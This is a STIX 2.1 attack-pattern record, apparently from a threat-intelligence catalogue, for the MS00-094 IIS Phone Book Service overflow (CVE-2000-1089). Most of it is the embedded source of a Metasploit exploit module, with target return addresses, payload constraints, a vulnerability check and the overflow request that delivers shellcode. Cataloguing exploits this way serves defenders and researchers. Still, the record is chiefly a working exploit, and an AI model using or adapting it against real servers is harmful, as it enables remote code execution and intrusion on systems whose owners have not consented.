{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86aa6c1d-31b9-4c2c-bf47-7ef87050cfbf",
    "created": "2024-08-14T16:55:54.199957Z",
    "modified": "2024-08-14T16:55:54.19996Z",
    "name": "MS00-094 Microsoft IIS Phone Book Service Overflow",
    "description": " This is an exploit for the Phone Book Service /pbserver/pbserver.dll",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/isapi/ms00_094_pbserver.rb",
            "external_id": "ms00_094_pbserver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-1089"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS00-094 Microsoft IIS Phone Book Service Overflow',\n      'Description'    => %q{\n          This is an exploit for the Phone Book Service /pbserver/pbserver.dll\n        described in MS00-094. By sending an overly long URL argument\n        for phone book updates, it is possible to overwrite the stack. This\n        module has only been tested against Windows 2000 SP1.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2000-1089' ],\n          [ 'OSVDB', '463' ],\n          [ 'BID', '2048' ],\n          [ 'MSB', 'MS00-094' ],\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 896,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20%&=?\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 SP1', { 'Ret' => 0x77e8898b }], # jmp esp kernel32.dll\n          ['Windows 2000 SP0', { 'Ret' => 0x77ea162b }], # call esp kernel32.dll\n          ['Windows NT SP6', { 'Ret' => 0x77f32836 }], # jmp esp kernel32.dll\n        ],\n      'DisclosureDate' => '2000-12-04',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('URL', [ true,  \"The path to pbserver.dll\", \"/pbserver/pbserver.dll\" ]),\n      ])\n  end\n\n  def check\n    print_status(\"Requesting the vulnerable ISAPI path...\")\n    res = send_request_raw({\n      'uri' => normalize_uri(datastore['URL'])\n    }, 5)\n\n    if (res and res.code == 400)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    print_status(\"Sending overflow...\")\n\n    res = send_request_raw({\n      'uri' => normalize_uri(datastore['URL']) + '?&&&&&&pb=' + payload.encoded + [target['Ret']].pack('V') + make_nops(8) + Rex::Arch::X86.jmp(-912)\n    }, 5)\n\n    handler\n\n  end\nend\n",
    "x_mitre_contributors": [
        "[ aushack ]",
        ""
    ],
    "x_mitre_disclosure_date": "2000-12-04",
    "x_mitre_platforms": [
        "win'"
    ]
}